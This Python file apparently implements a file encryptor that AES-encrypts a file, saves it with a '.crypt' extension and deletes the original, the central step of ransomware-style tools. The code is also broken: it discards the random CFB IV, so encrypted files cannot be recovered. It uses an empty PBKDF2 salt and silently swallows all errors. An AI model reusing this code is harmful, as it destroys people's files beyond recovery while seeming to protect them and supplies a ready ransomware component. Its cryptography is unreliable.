import os
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2


class Encryptor:
    keyHash = b''

    def __init__(self, key):
        # Generating a 128 bit key from the original key
        self.keyHash = PBKDF2(key, salt='', dkLen=16)

    def encrypt(self, data):
        try:
            # Creating a 'cipher' object for using AES encryption in CFB mode
            cipher = AES.new(key=self.keyHash, mode=AES.MODE_CFB)
            return cipher.encrypt(data)
        except:
            pass

    def encrypt_file(self, filePath):
        try:
            if(os.path.splitext(filePath)[1] != ".crypt"):
                # Reading the original file in bytes to get its plain text
                with open(filePath, 'rb') as fo:
                    plaintext = fo.read()

                enc = self.encrypt(plaintext)

                # Changing the file name to replace with custom extension "crypt"
                encryptedFilePath = os.path.splitext(filePath)[0] + ".crypt"

                # Creating and opening file to write the encoded file
                with open(encryptedFilePath, 'wb') as fo:
                    fo.write(enc)
                print("Encrypted:   " + filePath)
                os.remove(filePath)
            else:
                print("File already encrypted!")
        except:
            pass
